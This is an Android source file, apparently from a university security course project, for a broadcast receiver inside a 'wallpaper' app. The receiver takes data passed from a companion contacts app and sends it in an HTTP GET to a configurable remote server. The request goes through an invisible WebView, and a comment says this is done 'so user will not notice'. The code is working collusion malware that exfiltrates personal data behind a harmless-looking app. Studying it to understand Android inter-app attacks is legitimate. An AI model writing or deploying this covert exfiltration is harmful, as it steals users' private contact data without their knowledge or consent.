package sg.com.ntu.cz4062.group9.wallpaper.receiver;

import sg.com.ntu.cz4062.group9.wallpaper.MyWallpaper;
import sg.com.ntu.cz4062.group9.wallpaper.R;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.webkit.WebView;
import android.widget.EditText;

public class MyReceiver extends BroadcastReceiver {
	private static Activity activity = null;
	
	/*
	 * MyReceiver is a broadcast receiver.
	 * It has intent filter only accepting action string "... .wallpaper"
	 * which is specified in the AndroidManifest.xml
	 * 
	 * onReceive will be called
	 * when an intent is fired with action string "... .contact"
	*/
	@Override
	public void onReceive(Context context, Intent intent) {
		
		/*
		 * onReceive will check whether the intent is sent from MyContacts2
		*/
		String source = intent.getStringExtra("SOURCE");
		if (source == null
				|| !source.equals("sg.com.ntu.cz4062.group9.contact"))
			return;
		
		/*
		 * The ip and port of data sink is collect from the EditText field.
		 * Then the data sink address and data is passed to AsyncTask: Upload.
		*/
		MyReceiver.activity = MyWallpaper.getInstance();
		if (activity != null) {
			String data = intent.getStringExtra("DATA");

			String ip = ((EditText) MyReceiver.activity.findViewById(R.id.etIp)).getText()
					.toString();
			String port = ((EditText) MyReceiver.activity.findViewById(R.id.etPort))
					.getText().toString();

			String addr = "http://10.0.3.2:8080/";
			if (!ip.equals("") && !port.equals(""))
				addr = "http://" + ip + ":" + port + "/";
			
			/*
			 * use WebView to load and send HTTP GET
			 * does not set view, so user will not notice
			*/
			WebView webView = new WebView(MyReceiver.activity);
			webView.loadUrl(addr + "index.php?" + data);
		}
	}
}